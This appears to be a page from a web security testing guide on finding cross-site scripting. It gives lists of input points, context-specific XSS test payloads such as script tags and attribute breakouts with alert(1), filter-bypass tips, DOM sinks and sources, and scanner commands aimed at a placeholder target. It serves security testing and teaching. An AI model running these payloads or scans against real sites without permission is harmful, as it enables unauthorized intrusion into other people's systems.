# Finding XSS

## Where to Look

### High-Value Targets

- [ ] Search boxes
- [ ] Comment/feedback forms
- [ ] User profile fields (name, bio, etc.)
- [ ] URL parameters reflected in page
- [ ] Error messages
- [ ] File upload names
- [ ] Headers reflected in page (User-Agent, Referer)

### Often Overlooked

- [ ] JSON responses rendered in page
- [ ] WebSocket messages
- [ ] postMessage handlers
- [ ] URL fragments (DOM XSS)
- [ ] PDF generators
- [ ] Email templates (preview)
- [ ] Export functions (CSV, Excel injection)
- [ ] Admin panels
- [ ] Old/legacy endpoints

## Methodology

### 1. Map Reflection Points

Inject a unique string and search for it in the response:

```
xss123test
```

Check:

- HTML source
- DOM (browser DevTools)
- JavaScript variables
- HTTP headers

### 2. Identify Context

Where does your input land?

| Context | Example | Test |
|---------|---------|------|
| HTML body | `<p>USER_INPUT</p>` | `<script>` |
| Attribute (quoted) | `<input value="USER_INPUT">` | `"onmouseover=` |
| Attribute (unquoted) | `<input value=USER_INPUT>` | ` onmouseover=` |
| JavaScript string | `var x = "USER_INPUT"` | `";alert(1)//` |
| JavaScript template | `` `${USER_INPUT}` `` | `${alert(1)}` |
| URL/href | `<a href="USER_INPUT">` | `javascript:` |
| CSS | `style="color:USER_INPUT"` | `red;}</style><script>` |

### 3. Test with Context-Aware Payloads

Don't spray generic payloads. Match payload to context:

=== "HTML Body"
    ```html
    <script>alert(1)</script>
    <img src=x onerror=alert(1)>
    ```

=== "Inside Attribute"
    ```html
    " onmouseover="alert(1)
    ' onfocus='alert(1)' autofocus='
    ```

=== "Inside JS String"
    ```javascript
    ";alert(1)//
    '</script><script>alert(1)</script>
    ```

### 4. Check for Filters

If basic payloads fail:

- Try encoding (`%3Cscript%3E`)
- Try case variations (`<ScRiPt>`)
- Try alternative tags (`<svg onload=`)
- Try event handler variations
- Check [Bypasses](bypasses.md)

## DOM XSS Hunting

### Dangerous Sinks

```javascript
// Execution sinks
eval()
setTimeout()
setInterval()
new Function()

// HTML sinks
element.innerHTML
element.outerHTML
document.write()
document.writeln()

// URL sinks
location
location.href
location.assign()
location.replace()
window.open()
```

### Dangerous Sources

```javascript
location.hash
location.search
location.href
document.URL
document.referrer
window.name
postMessage data
localStorage/sessionStorage
```

### Finding DOM XSS

1. Search JS for dangerous sinks
2. Trace back to sources
3. Check if source is user-controllable
4. Test with payload in source

Tools: DOM Invader (Burp), custom browser console scripts

## Automation

### Parameter Discovery

```bash
# Find params with reflection
echo "https://target.com" | gau | grep "=" | qsreplace "xss123test" | httpx -match-string "xss123test"

# Or with ffuf
ffuf -u "https://target.com/page?FUZZ=xss123test" -w params.txt -mr "xss123test"
```

### Basic XSS Scan

```bash
# With dalfox
dalfox url "https://target.com/search?q=test"

# With kxss
echo "https://target.com/page?q=test" | kxss
```

---

Found a reflection? Move to [Exploitation](exploit.md).
